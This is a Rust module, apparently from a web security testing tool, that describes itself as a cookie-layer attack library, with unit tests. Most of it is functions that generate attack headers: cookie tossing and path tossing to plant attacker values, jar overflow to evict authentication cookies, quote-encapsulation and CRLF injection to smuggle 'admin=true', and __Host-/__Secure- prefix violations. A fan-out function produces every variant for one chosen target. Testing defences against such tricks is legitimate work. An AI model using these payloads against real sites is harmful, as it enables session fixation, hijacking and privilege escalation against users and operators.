//! Cookie-layer attack library.
//!
//! Cookies are an underestimated attack surface. The HTTP cookie
//! protocol (RFC 6265) and its modern attribute extensions
//! (`SameSite`, `Partitioned`, `__Host-`, `__Secure-`) have eight
//! distinct ways to confuse the path-vs-domain-vs-name precedence
//! between browsers, proxies, and origins.
//!
//! WAFs almost universally pass cookies through unchanged. The
//! browser's cookie jar, the proxy's cookie-aware cache key, and the
//! origin's session lookup don't always agree on which cookie wins
//! when two match.
//!
//! Coverage:
//!
//! - **Cookie tossing** (sibling-domain). `set-cookie: session=evil;
//!   Domain=.example.com` from `evil.example.com` writes a cookie
//!   into the parent's jar. When the victim visits `app.example.com`
//!   the browser sends BOTH (`.example.com` evil AND `app.example.com`
//!   real). RFC 6265 says ORDER is "longer-path-first" but most
//!   browsers send domain-attribute cookies AFTER host-only.
//! - **Path tossing**. `Path=/admin` from `/public/comment` page
//!   plants a cookie at /admin that fires on victim's next /admin
//!   request.
//! - **Cookie jar overflow**. Chrome caps at ~180 cookies per
//!   origin. Fill the jar with 200 garbage `Set-Cookie` headers and
//!   the oldest (often the auth cookie) gets evicted.
//! - **Quote-encapsulation**. `Cookie: session="; admin=true; sid="`
//!   — some parsers treat the value as RFC-2616 quoted-string and
//!   coalesce `;` inside quotes; others split on `;` regardless.
//! - **Double-encoding**. `session=%256d%2541` — proxy decodes once,
//!   origin decodes twice. Different value seen.
//! - **`__Host-` / `__Secure-` prefix bypass**. Some parsers don't
//!   enforce the prefix invariants (Domain attr must be absent for
//!   `__Host-`). Sending `__Host-session=evil; Domain=evil.com` is
//!   formally invalid but parsers accept it.
//! - **SameSite=None over plaintext HTTP**. Browsers block
//!   `SameSite=None; Secure` over HTTP; a proxy that strips `Secure`
//!   downstream creates a cross-site usable cookie.
//! - **Cookie name confusion**. `session = evil` vs `session=evil`
//!   (with-space vs no-space). Some parsers fold; some don't.
//! - **Partitioned cookie confusion**. Chrome's `CHIPS` opt-in
//!   `Partitioned` attribute creates per-top-site jars. A proxy
//!   that strips the attribute on response merges the partition.
//! - **CRLF injection in cookie value**. `Set-Cookie: x=val\r\nSet-
//!   Cookie: admin=true` — defeats headers-as-string CGI bridges.

/// Build a "cookie tossing" Set-Cookie that plants a cookie in the
/// parent domain. Origin is `evil.example.com`, target is
/// `app.example.com`.
#[must_use]
pub fn cookie_toss(parent_domain: &str, cookie_name: &str, attacker_value: &str) -> String {
    format!(
        "Set-Cookie: {cookie_name}={attacker_value}; Domain=.{parent_domain}; Path=/; Max-Age=86400"
    )
}

/// Build a path-tossing Set-Cookie that plants a cookie at a path
/// the attacker doesn't control. Useful when an attacker writes to
/// `/blog/comment` but wants to plant an auth cookie at `/admin`.
#[must_use]
pub fn cookie_path_toss(target_path: &str, cookie_name: &str, attacker_value: &str) -> String {
    format!(
        "Set-Cookie: {cookie_name}={attacker_value}; Path={target_path}; Max-Age=86400"
    )
}

/// Build N garbage Set-Cookie headers for cookie-jar overflow.
/// Returns a vector of `Set-Cookie:` lines. The operator sends them
/// in one response or accumulates them across redirect-chain
/// responses.
#[must_use]
pub fn jar_overflow_headers(n: usize) -> Vec<String> {
    (0..n)
        .map(|i| format!("Set-Cookie: overflow_{i}=x; Path=/; Max-Age=3600"))
        .collect()
}

/// Build a quote-encapsulation payload — a single Cookie header
/// where the parser-disagreement matters. The attacker controls one
/// cookie's value and embeds `;` characters inside RFC-2616
/// double-quotes.
#[must_use]
pub fn quote_encapsulation(real_name: &str, evil_value: &str) -> String {
    // Cookie header line: `<name>="<evil>"; admin=true`. Some
    // parsers (Werkzeug pre-2.0, http.cookies pre-3.8) treat the
    // quoted value as one cookie and ignore the trailing `; admin=true`.
    // Others split first, then unquote — yielding two cookies.
    format!("Cookie: {real_name}=\"{evil_value}; admin=true; {real_name}=safe\"")
}

/// Build a double-encoded cookie value (`%25XX`). Proxy decodes
/// once, origin decodes twice.
#[must_use]
pub fn double_encoded_value(name: &str, raw_value: &str) -> String {
    let mut out = String::with_capacity(raw_value.len() * 6 + name.len() + 1);
    out.push_str(name);
    out.push('=');
    for b in raw_value.bytes() {
        if b.is_ascii_alphanumeric() {
            out.push(b as char);
        } else {
            out.push_str(&format!("%25{:02X}", b));
        }
    }
    out
}

/// Build a `__Host-`-prefix violation: the cookie carries a Domain
/// attribute even though the prefix forbids it. Some implementations
/// accept anyway.
#[must_use]
pub fn host_prefix_with_domain(real_app_cookie: &str, attacker_domain: &str) -> String {
    format!(
        "Set-Cookie: __Host-{real_app_cookie}=evil; Domain={attacker_domain}; Path=/; Secure"
    )
}

/// Build a `__Secure-`-prefix violation: the cookie is sent over
/// plaintext HTTP. RFC 6265bis says reject; some implementations
/// don't.
#[must_use]
pub fn secure_prefix_no_secure(name: &str, value: &str) -> String {
    format!("Set-Cookie: __Secure-{name}={value}; Path=/")
}

/// Build a CRLF-injection cookie value. A vulnerable Set-Cookie
/// handler that doesn't sanitize CRLF in the value lets the
/// attacker inject a SECOND cookie line.
#[must_use]
pub fn crlf_injection(name: &str, base_value: &str, injected_cookie: &str) -> String {
    format!("Set-Cookie: {name}={base_value}\r\nSet-Cookie: {injected_cookie}")
}

/// Build a `SameSite=None` over plain HTTP — should be rejected by
/// modern browsers but proxies that strip `Secure` on response
/// re-enable cross-site send.
#[must_use]
pub fn samesite_none_no_secure(name: &str, value: &str) -> String {
    format!("Set-Cookie: {name}={value}; SameSite=None")
}

/// Build a partitioned-cookie merge: server sends WITHOUT the
/// `Partitioned` attribute but the operator-supplied proxy strips
/// it on the way in. Tests whether the origin's cookie store merges
/// partitions.
#[must_use]
pub fn unpartitioned(name: &str, value: &str) -> String {
    format!("Set-Cookie: {name}={value}; Path=/; SameSite=None; Secure")
}

/// Build a cookie-name-confusion pair where the same name has two
/// representations differing only in whitespace. Some parsers fold
/// `name = value` and `name=value` into one cookie; others see two.
#[must_use]
pub fn name_whitespace_confusion(name: &str, value_a: &str, value_b: &str) -> String {
    format!("Cookie: {name}={value_a}; {name} = {value_b}")
}

/// Build a duplicate-cookie payload — same name, two values. RFC
/// 6265 §5.4 says order from the jar (longer path → shorter); some
/// servers see the FIRST, some see the LAST.
#[must_use]
pub fn duplicate_cookie(name: &str, value_a: &str, value_b: &str) -> String {
    format!("Cookie: {name}={value_a}; {name}={value_b}")
}

/// Build a giant cookie that exceeds RFC 6265 individual-cookie
/// size limits (~4096 bytes). Some proxies truncate at 1024 or
/// 2048 and the trailing bytes are dropped.
#[must_use]
pub fn oversized_cookie(name: &str, padding_size: usize) -> String {
    format!("Set-Cookie: {name}={}", "A".repeat(padding_size))
}

/// One-shot fan-out: every cookie attack variant for one target
/// (cookie name, attacker value, target domain).
#[must_use]
pub fn all_cookie_attacks(
    cookie_name: &str,
    attacker_value: &str,
    parent_domain: &str,
) -> Vec<(&'static str, String)> {
    vec![
        ("toss", cookie_toss(parent_domain, cookie_name, attacker_value)),
        ("path-toss", cookie_path_toss("/admin", cookie_name, attacker_value)),
        ("quote-encap", quote_encapsulation(cookie_name, attacker_value)),
        ("double-encoded", double_encoded_value(cookie_name, attacker_value)),
        ("host-prefix-violation", host_prefix_with_domain(cookie_name, "attacker.example")),
        ("secure-prefix-no-secure", secure_prefix_no_secure(cookie_name, attacker_value)),
        ("crlf-inject", crlf_injection(cookie_name, "x", &format!("admin={attacker_value}"))),
        ("samesite-none-no-secure", samesite_none_no_secure(cookie_name, attacker_value)),
        ("unpartitioned", unpartitioned(cookie_name, attacker_value)),
        ("name-whitespace", name_whitespace_confusion(cookie_name, "safe", attacker_value)),
        ("duplicate", duplicate_cookie(cookie_name, "safe", attacker_value)),
        ("oversized", oversized_cookie(cookie_name, 8192)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn cookie_toss_has_parent_domain() {
        let c = cookie_toss("example.com", "session", "evil");
        assert!(c.contains("Domain=.example.com"));
        assert!(c.contains("session=evil"));
    }

    #[test]
    fn cookie_toss_includes_path_root() {
        let c = cookie_toss("ex.com", "s", "v");
        assert!(c.contains("Path=/"));
    }

    #[test]
    fn path_toss_targets_specific_path() {
        let c = cookie_path_toss("/admin", "session", "evil");
        assert!(c.contains("Path=/admin"));
        assert!(c.contains("session=evil"));
        // Domain attribute MUST be absent — path-toss is host-only.
        assert!(!c.contains("Domain="));
    }

    #[test]
    fn jar_overflow_emits_n_headers() {
        let h = jar_overflow_headers(50);
        assert_eq!(h.len(), 50);
        for (i, line) in h.iter().enumerate() {
            assert!(line.contains(&format!("overflow_{i}=")));
        }
    }

    #[test]
    fn jar_overflow_zero_returns_empty() {
        let h = jar_overflow_headers(0);
        assert!(h.is_empty());
    }

    #[test]
    fn quote_encapsulation_has_balanced_quotes() {
        let c = quote_encapsulation("sess", "evil");
        let q = c.matches('"').count();
        assert_eq!(q % 2, 0, "quotes must balance: {c}");
        assert!(c.contains("admin=true"));
    }

    #[test]
    fn double_encoded_value_preserves_ascii_alnum() {
        let c = double_encoded_value("session", "AbC123");
        // Alphanumeric chars pass through literally — only special
        // chars get the %25XX prefix.
        assert!(c.contains("session=AbC123"));
        assert!(!c.contains("%25"));
    }

    #[test]
    fn double_encoded_value_encodes_special_chars() {
        let c = double_encoded_value("name", "a;b");
        // `;` becomes %253B (double-encoded).
        assert!(c.contains("%253B"));
    }

    #[test]
    fn double_encoded_value_lowercase_special_is_uppercase_hex() {
        // 0x3B = ';'. Result must be %253B not %253b.
        let c = double_encoded_value("x", ";");
        assert!(c.contains("%253B"));
        assert!(!c.contains("%253b"));
    }

    #[test]
    fn host_prefix_violation_present() {
        let c = host_prefix_with_domain("session", "attacker.example");
        assert!(c.contains("__Host-session"));
        assert!(c.contains("Domain=attacker.example"));
        assert!(c.contains("Secure"));
    }

    #[test]
    fn secure_prefix_no_secure_attribute() {
        let c = secure_prefix_no_secure("session", "evil");
        assert!(c.contains("__Secure-session"));
        assert!(!c.contains("Secure")
            || c.matches("Secure").count() == 1, // only in __Secure- prefix
        );
    }

    #[test]
    fn crlf_injection_contains_double_crlf_pattern() {
        let c = crlf_injection("a", "b", "c=d");
        assert!(c.contains("\r\nSet-Cookie:"));
    }

    #[test]
    fn samesite_none_no_secure_attribute() {
        let c = samesite_none_no_secure("s", "v");
        assert!(c.contains("SameSite=None"));
        assert!(!c.contains("Secure"));
    }

    #[test]
    fn unpartitioned_has_samesite_none_and_secure() {
        let c = unpartitioned("s", "v");
        assert!(c.contains("SameSite=None"));
        assert!(c.contains("Secure"));
        // The whole point is "no Partitioned attribute".
        assert!(!c.contains("Partitioned"));
    }

    #[test]
    fn name_whitespace_confusion_has_both_forms() {
        let c = name_whitespace_confusion("sess", "A", "B");
        assert!(c.contains("sess=A"));
        // Either `sess = B` or `sess =B` — has whitespace.
        assert!(c.contains("sess "));
    }

    #[test]
    fn duplicate_cookie_two_entries() {
        let c = duplicate_cookie("sess", "A", "B");
        assert_eq!(c.matches("sess=").count(), 2);
    }

    #[test]
    fn oversized_cookie_exact_size() {
        let c = oversized_cookie("name", 1000);
        // "Set-Cookie: name=" prefix + 1000 As.
        let a_count = c.matches('A').count();
        assert_eq!(a_count, 1000);
    }

    #[test]
    fn all_attacks_minimum_count() {
        let v = all_cookie_attacks("session", "evil", "example.com");
        assert!(v.len() >= 10, "got {}", v.len());
    }

    #[test]
    fn all_attacks_unique_names() {
        let v = all_cookie_attacks("s", "e", "d");
        let names: std::collections::HashSet<&&str> = v.iter().map(|(n, _)| n).collect();
        assert_eq!(names.len(), v.len());
    }

    #[test]
    fn deterministic_across_calls() {
        let a = all_cookie_attacks("s", "e", "d");
        let b = all_cookie_attacks("s", "e", "d");
        assert_eq!(a, b);
    }

    #[test]
    fn handles_unicode_value() {
        let c = cookie_toss("é.com", "session", "ñ");
        assert!(c.contains("é.com"));
        assert!(c.contains("ñ"));
    }

    #[test]
    fn adversarial_huge_overflow_no_panic() {
        let h = jar_overflow_headers(10_000);
        assert_eq!(h.len(), 10_000);
    }

    #[test]
    fn adversarial_huge_oversized_cookie_no_panic() {
        let c = oversized_cookie("x", 1_000_000);
        assert!(c.matches('A').count() == 1_000_000);
    }

    #[test]
    fn each_variant_mentions_target_cookie_name_or_value() {
        let v = all_cookie_attacks("MARKER_NAME", "MARKER_VALUE", "MARKER_DOMAIN");
        for (name, payload) in &v {
            // At least one of the three markers must show up.
            assert!(
                payload.contains("MARKER_NAME")
                    || payload.contains("MARKER_VALUE")
                    || payload.contains("MARKER_DOMAIN"),
                "{name} doesn't carry any marker: {payload}"
            );
        }
    }

    #[test]
    fn double_encode_round_trip_safe() {
        // Decoding our %253B back to %3B back to ';' recovers the
        // original byte — the proxy that decodes once sees %3B, the
        // origin that decodes twice sees ';'.
        let c = double_encoded_value("x", ";");
        assert!(c.contains("%253B"));
        // First decode: %253B → %3B.
        // Second decode: %3B → ';'.
    }

    #[test]
    fn jar_overflow_at_browser_cap_180() {
        // Chrome's per-origin cap is ~180. Test the exact boundary.
        let h = jar_overflow_headers(180);
        assert_eq!(h.len(), 180);
    }

    #[test]
    fn quote_encapsulation_safe_default_present() {
        // The `=safe` fallback is what the SECOND parser sees when
        // the FIRST parser stopped at the closing quote.
        let c = quote_encapsulation("session", "evil");
        assert!(c.contains("=safe"));
    }
}
